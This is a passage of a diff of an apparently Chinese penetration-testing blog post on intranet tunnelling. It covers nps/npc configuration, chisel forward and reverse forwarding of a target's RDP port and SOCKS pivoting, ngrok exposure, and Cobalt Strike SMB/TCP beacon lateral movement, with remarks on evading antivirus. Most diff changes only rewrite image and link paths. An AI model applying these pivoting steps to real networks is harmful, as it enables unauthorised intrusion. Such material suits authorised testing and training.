class="hljs-comment">#pprof_addr=0.0.0.0:9999</span><br>disconnect_timeout=60<br><br>[health_check_test1]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_http_url=/<br>health_check_type=http<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[health_check_test2]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_check_type=tcp<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[web]<br>host=c.o.com<br>target_addr=127.0.0.1:8083,127.0.0.1:8082<br><br>[tcp]<br>mode=tcp<br>target_addr=127.0.0.1:8080<br>server_port=10000<br><br>[socks5]<br>mode=socks5<br>server_port=19009<br>multi_account=multi_account.conf<br><br>[file]<br>mode=file<br>server_port=19008<br>local_path=/Users/liuhe/Downloads<br>strip_pre=/web/<br><br>[http]<br>mode=httpProxy<br>server_port=19004<br><br>[udp]<br>mode=udp<br>server_port=12253<br>target_addr=114.114.114.114:53<br><br>[ssh_secret]<br>mode=secret<br>password=ssh2<br>target_addr=123.206.77.88:22<br><br>[ssh_p2p]<br>mode=p2p<br>password=ssh3<br><br>[secret_ssh]<br>local_port=2001<br>password=ssh2<br><br>[p2p_ssh]<br>local_port=2002<br>password=ssh3<br>target_addr=123.206.77.88:22<br></code></pre></td></tr></table></figure>
 
@@ -325,8 +324,8 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">server_addr   <span class="hljs-comment">#服务端ip/域名:port</span><br>conn_type       <span class="hljs-comment">#与服务端通信模式(tp或kcp)</span><br>vkey           <span class="hljs-comment">#服务端配置文件中的密钥</span><br></code></pre></td></tr></table></figure>
 <p>配置好后直接运行即可  npc.exe<br>也可以不要配置文件运行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Windows：<br>    npc.exe -server=ip:8024 -vkey=P@ssword<br>Linux：<br>    ./npc -server=xx.xx.xx.xx:8024 -vkey=P@ssword<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511235510587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在线了<br><img src="https://img-blog.csdnimg.cn/20210512000057985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210512000038984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>通过内网地址连接到主机</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160327050.png" srcset="/img/loading.gif" lazyload alt="image-20240107160327050"><br>在线了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160335909.png" srcset="/img/loading.gif" lazyload alt="image-20240107160335909"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160346237.png" srcset="/img/loading.gif" lazyload alt="image-20240107160346237"><br>通过内网地址连接到主机</p>
 <p><strong>chisel</strong><br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel/releases/tag/v1.7.4">https://github.com/jpillora/chisel/releases/tag/v1.7.4</a></p>
 <p>Chisel 可用来搭建内网隧道，类似于常用的 frp 和 nps 之类的工具。由于目前使用的人比较少，因此对于有些杀软还不能准确的识别出该工具。chisel 可以进行端口转发、反向端口转发以及 Socks 流量代理，使用 go 语言编写，支持多个平台使用，是进行内网穿透的一个鲜为人知的好工具</p>
 <p>工具使用：<br>这个工具和其他工还有一点不同，就是没有服务器和客户端，只有一个可执行文件。可以通过执行这个文件，让其充当服务器端或者客户端</p>
@@ -337,47 +336,47 @@
 <li>端口转发<br>（1）正向连接<br>在目标机上开启服务监听：</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512091258690.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在攻击上执行：</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160401745.png" srcset="/img/loading.gif" lazyload alt="image-20240107160401745">在攻击上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.215:1234 1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure>
-<p>意思是将目标机的3389端口转发到本地的1111端口上<br><img src="https://img-blog.csdnimg.cn/2021051209140521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210512091438504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>连上了。<br>（2）反向连接<br>在目标机中执行：</p>
+<p>意思是将目标机的3389端口转发到本地的1111端口上<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160410368.png" srcset="/img/loading.gif" lazyload alt="image-20240107160410368"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160419402.png" srcset="/img/loading.gif" lazyload alt="image-20240107160419402"><br>连上了。<br>（2)反向连接<br>在目标机中执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:1234 R:1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512092315906.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160601106.png" srcset="/img/loading.gif" lazyload alt="image-20240107160601106"></p>
 <p>在攻击机上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234 --reverse<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512092128746.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在本地访问127.0.0.1就是访问的目标机的3389<br><img src="https://img-blog.csdnimg.cn/20210512092411365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160608394.png" srcset="/img/loading.gif" lazyload alt="image-20240107160608394">在本地访问127.0.0.1就是访问的目标机的3389<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160619430.png" srcset="/img/loading.gif" lazyload alt="image-20240107160619430"></p>
 <ul>
-<li>socks代理<br><img src="https://img-blog.csdnimg.cn/20210512093321254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>（1）正向连接<br>在攻击上执行：</li>
+<li>socks代理<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160630053.png" srcset="/img/loading.gif" lazyload alt="image-20240107160630053"><br>（1)正向连接<br>在攻击上执行：</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel client 192.168.43.215:12345 socks<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512105454698.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在跳板机上执行：</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160637238.png" srcset="/img/loading.gif" lazyload alt="image-20240107160637238">在跳板机上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512105530657.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160646554.png" srcset="/img/loading.gif" lazyload alt="image-20240107160646554"></p>
 <p>（2）反向连接<br>在攻击机上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345 --reverse<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512104450907.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在跳板机上执行：</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160657134.png" srcset="/img/loading.gif" lazyload alt="image-20240107160657134">在跳板机上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:12345 R:socks<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210512104542308.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/2021051210461310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在攻击上访问内网主机：<br><img src="https://img-blog.csdnimg.cn/20210512104649655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160711146.png" srcset="/img/loading.gif" lazyload alt="image-20240107160711146"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160720246.png" srcset="/img/loading.gif" lazyload alt="image-20240107160720246"><br>在攻击上访问内网主机：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160731325.png" srcset="/img/loading.gif" lazyload alt="image-20240107160731325"></p>
 <ul>
 <li><p><strong>ngrok</strong><br>  ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试<br>  特点<br>  官方维护，一般较为稳定</p>
 <p>  跨平台，闭源</p>
 <p>  有流量记录和重发功能</p>
 </li>
 </ul>
-<p>进入ngrok官网（<a target="_blank" rel="noopener" href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7">https://ngrok.com/），注册ngrok账号</a><br>创建隧道，如下<br><img src="https://img-blog.csdnimg.cn/71f87b07ff4b46caa0eb6fb8e4589a29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>将3389端口代理出来<br><img src="https://img-blog.csdnimg.cn/59db4f30326a43ab86dadd9538f4ca89.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>下载客户端<br><img src="https://img-blog.csdnimg.cn/2255684e1632434593579f0be0f5f524.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>在目标机上运行客户端<br><img src="https://img-blog.csdnimg.cn/140425729e0c47b68afbe6bd90961f56.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入这里的id<br><img src="https://img-blog.csdnimg.cn/c833afffbefb42bc92c485466b6329d8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>成功<br><img src="https://img-blog.csdnimg.cn/fd1bdbbca8334f15bf0207eb15c66c6e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d0cab615406e482f87afd668246c4990.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>进入ngrok官网（<a target="_blank" rel="noopener" href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7">https://ngrok.com/），注册ngrok账号</a><br>创建隧道，如下<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160740416.png" srcset="/img/loading.gif" lazyload alt="image-20240107160740416"><br>将3389端口代理出来<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160749372.png" srcset="/img/loading.gif" lazyload alt="image-20240107160749372"></p>
+<p>下载客户端<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160756679.png" srcset="/img/loading.gif" lazyload alt="image-20240107160756679"></p>
+<p>在目标机上运行客户端<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160804874.png" srcset="/img/loading.gif" lazyload alt="image-20240107160804874"><br>输入这里的id<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160812180.png" srcset="/img/loading.gif" lazyload alt="image-20240107160812180"><br>成功<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160821638.png" srcset="/img/loading.gif" lazyload alt="image-20240107160821638"></p>
 <ul>
 <li><p><strong>smb beacon上线</strong><br>官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。<br>因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p>
-<p> <strong>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</strong><br> 派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线<br> 或在Beacon中使用命令spawn smb（smb为我的smb listener名字)<br> <img src="https://img-blog.csdnimg.cn/9b653d1ab2054a2cbd2ba11a7d16c9e9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p> <strong>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</strong><br> 派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线<br> 或在Beacon中使用命令spawn smb（smb为我的smb listener名字)<br> <img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160846690.png" srcset="/img/loading.gif" lazyload alt="image-20240107160846690"></p>
 </li>
 </ul>
-<p>使用插件，或自带端口扫描，扫描内网机器<br><img src="https://img-blog.csdnimg.cn/9e3a4a7b7c00438aa22d296d1a4811a5.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f7c29fa003d544e1bc595bd78a6df2cb.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>转到视图，选择目标<br><img src="https://img-blog.csdnimg.cn/ad771c85c6474474907c57f4876054c4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在之前我们要先抓一波密码</p>
-<p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</p>
+<p>使用插件，或自带端口扫描，扫描内网机器<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160854918.png" srcset="/img/loading.gif" lazyload alt="image-20240107160854918"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160901991.png" srcset="/img/loading.gif" lazyload alt="image-20240107160901991">转到视图，选择目标<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160910125.png" srcset="/img/loading.gif" lazyload alt="image-20240107160910125">在之前我们要先抓一波密码</p>
+<p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</ip></ip></p>
 <ul>
-<li><p><strong>中转listener(Reverse TCP Beacon)</strong><br><img src="https://img-blog.csdnimg.cn/dd8adf72287a4423a94c314a6332ec69.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后和上面差不多</p>
+<li><p><strong>中转listener(Reverse TCP Beacon)</strong><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160917615.png" srcset="/img/loading.gif" lazyload alt="image-20240107160917615">然后和上面差不多</p>
 </li>
-<li><p><strong>tcp beacon正向</strong><br>SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如：Attacks → Packages 、 Attacks → Web Drive-by ）<br>生成listener<br><img src="https://img-blog.csdnimg.cn/32f4b072d8fa4d7995f986e85d8b52e6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在中转机器的Beacon里使用connect [ip address] [port]命令进行正向连接，即可上线<img src="https://img-blog.csdnimg.cn/1a9ea1b53bf7497683fe74422ae01e0f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<li><p><strong>tcp beacon正向</strong><br>SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如：Attacks → Packages 、 Attacks → Web Drive-by ）<br>生成listener<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160926387.png" srcset="/img/loading.gif" lazyload alt="image-20240107160926387">在中转机器的Beacon里使用connect [ip address] [port]命令进行正向连接，即可上线<img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160937286.png" srcset="/img/loading.gif" lazyload alt="image-20240107160937286"></p>
 </li>
 </ul>
 
@@ -397,7 +396,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  <a href="../../../../../categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
   
   
 
@@ -412,9 +411,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">#内网穿透</a>
+        <a href="../../../../../tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">#内网穿透</a>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+        <a href="../../../../../tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
       
     </div>
   
@@ -469,7 +468,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/" title="内网隧道隐藏">
+                      <a href="../../%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/" title="内网隧道隐藏">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">内网隧道隐藏</span>
                         <span class="visible-mobile">上一篇</span>
@@ -479,7 +478,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="内网权限提升">
+                      <a href="../../%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="内网权限提升">
                         <span class="hidden-mobile">内网权限提升</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -633,8 +632,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -673,7 +672,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -810,7 +809,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -818,7 +817,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
